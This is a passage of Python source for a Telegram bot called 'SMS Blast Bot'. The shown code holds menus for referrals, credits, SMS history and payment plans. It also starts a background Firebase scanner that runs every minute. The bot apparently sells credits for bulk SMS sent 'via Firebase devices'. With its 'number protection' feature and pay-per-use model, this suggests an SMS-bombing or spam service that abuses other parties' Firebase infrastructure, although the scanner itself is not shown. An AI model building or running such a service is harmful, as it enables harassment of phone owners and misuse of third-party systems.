    d = load(); uid = cq.from_user.id
    code = generate_user_refer_code(uid, d); save(d)
    rc = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"{em(EMOJI_STAR,'👥')} <b>Referral</b>\n\n"
        f"Share code, earn <b>{rc}</b> credits per referral!\n\n"
        f"{em(EMOJI_GIFT,'🎁')} Your code: <code>{code}</code>\n\n"
        f"{em(EMOJI_GEAR,'🔗')} https://t.me/{me.username}?start={code}",
        reply_markup=kb((sc("back"), "user:home")), parse_mode="HTML")

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    udata = d["users"].get(str(uid), {}); stats = d.get("stats", {})
    await cq.message.edit_text(
        f"{em(EMOJI_STAR,'📊')} <b>Your Stats</b>\n\n"
        f"💰 Credits: <b>{udata.get('credits',0)}</b>\n"
        f"📤 SMS Sent: <b>{udata.get('uses',0)}</b>\n"
        f"📅 Joined: <b>{fmt_time(udata.get('joined_at',0))}</b>\n\n"
        f"📈 Bot Total Sent: <b>{stats.get('total_sent',0)}</b>",
        reply_markup=kb((sc("back"), "user:home")), parse_mode="HTML")

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    hist = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not hist:
        text = f"{em(EMOJI_GEAR,'📜')} <b>Your SMS History</b>\n\n<i>Empty.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR,'📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, e in enumerate(reversed(hist), 1):
            status = e.get("status", "?")
            icon = "✅" if status == "sent" else "🛑" if status == "stopped" else "⏳"
            lines.append(f"{i}. [{fmt_time(e.get('timestamp',0))}] {icon} <code>{mask_number(e.get('number','?'))}</code> — {e.get('message','')[:30]}...")
        text = "\n".join(lines)
    await cq.message.edit_text(text,
        reply_markup=kb((sc("back"), "user:home")), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load(); plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ No plans available!", show_alert=True); return
    text = f"{em(EMOJI_MONEY,'💰')} <b>Buy Credits</b>\n\n"
    for p in plans:
        text += (f"{em(EMOJI_STAR,'📋')} <b>{p['name']}</b>\n"
                 f"   💰 {p['price']} {p.get('currency','INR')}\n"
                 f"   🎁 {p['credits']} credits\n\n")
    rows = [[btn_url(f"Buy {sc(p['name'][:20])}", p['payment_link'], EMOJI_MONEY, "💳")] for p in plans]
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await cq.message.edit_text(
        f"{em(EMOJI_GEAR,'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"🤖 Bulk SMS via Firebase devices.\n\n"
        f"👤 Dev: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"💬 Support: {SUPER_ADMIN_NAME}\n\n"
        f"<i>Need credits? Use referral or buy.</i>",
        reply_markup=kb((sc("back"), "user:home")),
        parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ===== MAIN =====
async def main():
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(R)
    me = await bot.get_me()
    log.info(f"@{me.username} — SMS Blast Bot {_VERSION} started!")
    asyncio.create_task(background_firebase_scanner(bot))
    log.info("Background scanner task created")
    try:
        await bot.send_message(
            MAIN_OWNER,
            f"{em(EMOJI_ROCKET,'🚀')} <b>SMS Blast Bot {_VERSION} Online!</b>\n@{me.username}\n"
            f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
            f"{em(EMOJI_GEAR,'🔄')} Scanner starting...\n"
            f"{em(EMOJI_WARNING,'⏱')} Interval: 1 min\n"
            f"{em(EMOJI_STAR,'👥')} Per-user sessions: ON\n"
            f"{em(EMOJI_LOCK,'🔒')} Number protection: ON\n"
            f"{em(EMOJI_VIDEO,'📹')} Videos: ON\n"
            f"{em(EMOJI_MONEY,'💸')} Credit transfer: ON\n"
            f"👤 Dev: {SUPER_ADMIN_NAME}",
            parse_mode="HTML")
    except Exception as e:
        log.warning(f"Owner notify: {e}")
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())

#🗿 Bot Developer - @deathalive07
#🔰 Developer Channel - @trusteddealers07
